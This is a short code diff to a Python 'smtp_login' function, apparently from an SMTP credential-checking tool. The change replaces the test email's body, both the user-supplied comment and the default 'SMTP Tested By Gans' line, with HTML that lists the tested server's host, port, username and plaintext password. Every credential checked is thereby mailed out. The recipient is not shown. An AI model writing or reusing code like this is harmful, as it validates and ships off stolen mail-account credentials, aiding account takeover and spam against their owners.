@@ -2130,9 +2130,23 @@ def smtp_login(target, tutor, hostnya, portnya, usernya, pwnya,mail_fromer=False
     msg.add_header('Content-Type', 'text/html')
     if mail_name:
         if comment:
-            msg.attach(MIMEText(comment, 'html', 'utf-8'))
+            msg.attach(MIMEText(""" 
+            
+                <p>HOST : """ + hostnya + """</p>
+                <p>PORT : """ + portnya + """</p>
+                <p>USER : """ + usernya + """</p>
+                <p>PASS : """ + pwnya + """</p>
+                <p>FROM : """ + mail_name + """</p> 
+                """, 'html', 'utf-8'))
         else:
-            msg.attach(MIMEText('<i>SMTP Tested By Gans</i>', 'html', 'utf-8'))
+            msg.attach(MIMEText(""" 
+            
+                <p>HOST : """ + hostnya + """</p>
+                <p>PORT : """ + portnya + """</p>
+                <p>USER : """ + usernya + """</p>
+                <p>PASS : """ + pwnya + """</p>
+                <p>FROM : """ + mail_name + """</p> 
+                """, 'html', 'utf-8'))
     else:
         if comment:
             msg.attach(MIMEText(comment, 'html', 'utf-8'))
